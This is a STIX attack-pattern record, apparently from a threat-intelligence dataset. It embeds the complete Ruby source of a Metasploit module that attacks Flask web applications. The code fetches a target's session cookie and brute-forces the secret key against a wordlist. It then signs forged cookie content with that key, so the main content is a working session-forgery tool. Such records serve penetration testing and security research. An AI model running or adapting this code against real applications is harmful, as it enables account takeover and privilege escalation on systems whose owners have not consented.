{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1f758cd4-1a5a-46cf-9b92-cf1f388771dc",
    "created": "2024-08-14T16:32:15.146581Z",
    "modified": "2024-08-14T16:32:15.146584Z",
    "name": "Python Flask Cookie Signer",
    "description": " This is a generic module which can manipulate Python Flask-based application cookies. The Retrieve action will connect to a web server, grab the cookie, and decode it. The Resign action will do the same as above, but after decoding it, it will replace the contents with that in NEWCOOKIECONTENT, then sign the cookie with SECRET. This cookie can then be used in a browser. This is a Ruby based implementation of some of the features in the Python project Flask-Unsign. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/python_flask_cookie_signer.rb",
            "external_id": "python_flask_cookie_signer.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Paradoxis/Flask-Unsign"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Python Flask Cookie Signer',\n        'Description' => %q{\n          This is a generic module which can manipulate Python Flask-based application cookies.\n          The Retrieve action will connect to a web server, grab the cookie, and decode it.\n          The Resign action will do the same as above, but after decoding it, it will replace\n          the contents with that in NEWCOOKIECONTENT, then sign the cookie with SECRET. This\n          cookie can then be used in a browser. This is a Ruby based implementation of some\n          of the features in the Python project Flask-Unsign.\n        },\n        'Author' => [\n          'h00die', # MSF module\n          'paradoxis', #  original flask-unsign tool\n          'Spencer McIntyre', # MSF flask-unsign library\n        ],\n        'References' => [\n          ['URL', 'https://github.com/Paradoxis/Flask-Unsign'],\n        ],\n        'License' => MSF_LICENSE,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => []\n        },\n        'Actions' => [\n          ['Retrieve', { 'Description' => 'Retrieve a cookie from an HTTP(s) server' }],\n          ['FindSecret', { 'Description' => 'Brute force the secret key used to sign the cookie' }],\n          ['Resign', { 'Description' => 'Resign the specified cookie data' }]\n        ],\n        'DefaultAction' => 'Retrieve',\n        'DisclosureDate' => '2019-01-26' # first commit by @Paradoxis to the Flask-Unsign repo\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('TARGETURI', [ true, 'URI to browse', '/']),\n        OptString.new('NEWCOOKIECONTENT', [ false, 'Content of a cookie to sign', ''], conditions: %w[ACTION == Resign]),\n        OptString.new('SECRET', [ true, 'The key with which to sign the cookie', '']),\n        OptPath.new('SECRET_KEYS_FILE', [\n          false, 'File containing secret keys to try, one per line',\n          File.join(Msf::Config.data_directory, 'wordlists', 'flask_secret_keys.txt')\n        ], conditions: %w[ACTION == FindSecret]),\n      ]\n    )\n    register_advanced_options(\n      [\n        OptString.new('CookieName', [ true, 'The name of the session cookie', 'session' ]),\n        OptString.new('Salt', [ true, 'The salt to use for key derivation', Msf::Exploit::Remote::HTTP::FlaskUnsign::Session::DEFAULT_SALT ])\n      ]\n    )\n  end\n\n  def action_find_secret\n    print_status(\"#{peer} - Retrieving Cookie\")\n    res = send_request_cgi!({\n      'uri' => normalize_uri(target_uri.path),\n      'keep_cookies' => true\n    })\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response code (#{res.code})\") unless res.code == 200\n\n    cookie = cookie_jar.cookies.find { |c| c.name == datastore['CookieName'] }&.cookie_value\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Response is missing the session cookie\") unless cookie\n\n    print_status(\"#{peer} - Initial Cookie: #{cookie}\")\n\n    # get the cookie value and strip off anything else\n    cookie = cookie.split('=')[1].gsub(';', '')\n\n    File.open(datastore['SECRET_KEYS_FILE'], 'rb').each do |secret|\n      secret = secret.strip\n      vprint_status(\"#{peer} - Checking secret key: #{secret}\")\n\n      unescaped_secret = unescape_string(secret)\n      unless Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.valid?(cookie, unescaped_secret)\n        vprint_bad(\"#{peer} - Incorrect secret key: #{secret}\")\n        next\n      end\n\n      print_good(\"#{peer} - Found secret key: #{secret}\")\n      return secret\n    end\n    nil\n  end\n\n  def action_retrieve\n    print_status(\"#{peer} - Retrieving Cookie\")\n    res = send_request_cgi!({\n      'uri' => normalize_uri(target_uri.path),\n      'keep_cookies' => true\n    })\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response code (#{res.code})\") unless res.code == 200\n\n    cookie = cookie_jar.cookies.find { |c| c.name == datastore['CookieName'] }&.cookie_value\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Response is missing the session cookie\") unless cookie\n\n    print_status(\"#{peer} - Initial Cookie: #{cookie}\")\n    cookie = cookie.split('=')[1].gsub(';', '')\n    begin\n      decoded_cookie = Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.decode(cookie)\n    rescue StandardError => e\n      print_error(\"Failed to decode the cookie: #{e.class} #{e}\")\n      return\n    end\n\n    print_status(\"#{peer} - Decoded Cookie: #{decoded_cookie}\")\n\n    # use dehex to allow \\x style escape sequences for unprintable chars\n    secret = unescape_string(datastore['SECRET'])\n    salt = unescape_string(datastore['Salt'])\n\n    if Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.valid?(cookie, secret, salt: salt)\n      print_good(\"#{peer} - Secret key #{secret.inspect} is correct.\")\n    elsif datastore['SECRET'].present?\n      print_warning(\"#{peer} - Secret key #{secret.inspect} is incorrect.\")\n    end\n  end\n\n  def run\n    case action.name\n    when 'Retrieve'\n      action_retrieve\n    when 'FindSecret'\n      action_find_secret\n    when 'Resign'\n      print_status(\"Attempting to sign with key: #{datastore['SECRET']}\")\n      secret = Rex::Text.dehex(datastore['SECRET'])\n      salt = Rex::Text.dehex(datastore['Salt'])\n      encoded_cookie = Msf::Exploit::Remote::HTTP::FlaskUnsign::Session.sign(datastore['NEWCOOKIECONTENT'], secret, salt: salt)\n      print_good(\"#{peer} - New signed cookie: #{datastore['CookieName']}=#{encoded_cookie}\")\n    end\n  end\n\n  def unescape_string(string)\n    Rex::Text.dehex(string.gsub('\\\\', '\\\\').gsub('\\\\n', \"\\n\").gsub('\\\\t', \"\\t\"))\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-01-26 # first commit by @Paradoxis to the Flask-Unsign repo"
}